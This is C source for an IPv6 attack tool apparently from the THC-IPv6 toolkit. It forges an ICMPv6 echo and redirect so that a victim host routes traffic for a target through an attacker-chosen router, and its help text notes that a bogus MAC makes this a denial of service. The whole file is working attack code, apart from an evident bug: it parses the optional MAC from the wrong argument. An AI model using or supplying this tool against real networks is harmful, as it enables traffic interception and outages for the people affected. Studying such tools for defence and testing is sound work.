#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

extern int debug;

void help(char *prg) {
  printf("%s %s (c) 2010 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s [-r] interface src-ip target-ip original-router new-router [new-router-mac]\n\n", prg);
  printf("Implant a route into src-ip, which redirects all traffic to target-ip to\n");
  printf("new-ip. You must know the router which would handle the route.\n");
  printf("If the new-router-mac does not exist, this results in a DOS.\n");
  printf("Use -r to use raw mode.\n\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  unsigned char *pkt = NULL, buf[16], mac[7] = "", fakemac[7] = "\x00\x00\xde\xad\xbe\xef";
  unsigned char *mac6 = mac, *src6, *target6, *oldrouter6, *newrouter6;
  int pkt_len = 0;
  thc_ipv6_hdr *ipv6;
  char *interface;
  int rawmode = 0;

  if (argc < 6 || strncmp(argv[1], "-h", 2) == 0)
    help(argv[0]);

  if (strcmp(argv[1], "-r") == 0) {
    thc_ipv6_rawmode(1);
    rawmode = 1;
    argv++;
    argc--;
  }

  interface = argv[1];
  src6 = thc_resolve6(argv[2]);
  target6 = thc_resolve6(argv[3]);
  oldrouter6 = thc_resolve6(argv[4]);
  newrouter6 = thc_resolve6(argv[5]);
  
  if (rawmode == 0) {
    if (argv[5] != NULL)
      sscanf(argv[5], "%x:%x:%x:%x:%x:%x", (unsigned int*)&mac[0], (unsigned int*)&mac[1], (unsigned int*)&mac[2], (unsigned int*)&mac[3], (unsigned int*)&mac[4], (unsigned int*)&mac[5]);
    else
      mac6 = thc_get_own_mac(interface);
  }

  memset(buf, 'A', 16);

  if ((pkt = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len, target6, src6, 0, 0, 0, 0, 0)) == NULL)
    return -1;
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_PINGREQUEST, 0, 0xdeadbeef, (unsigned char *) &buf, 16, 0) < 0)
    return -1;
  if (thc_generate_and_send_pkt(interface, fakemac, NULL, pkt, &pkt_len) < 0) {
    fprintf(stderr, "Error: Can not send packet, exiting ...\n");
    exit(-1);
  }

  ipv6 = (thc_ipv6_hdr *) pkt;
  thc_inverse_packet(ipv6->pkt + 14, ipv6->pkt_len - 14);

  thc_redir6(interface, oldrouter6, fakemac, NULL, newrouter6, mac6, ipv6->pkt + 14, ipv6->pkt_len - 14);

  return 0;
}
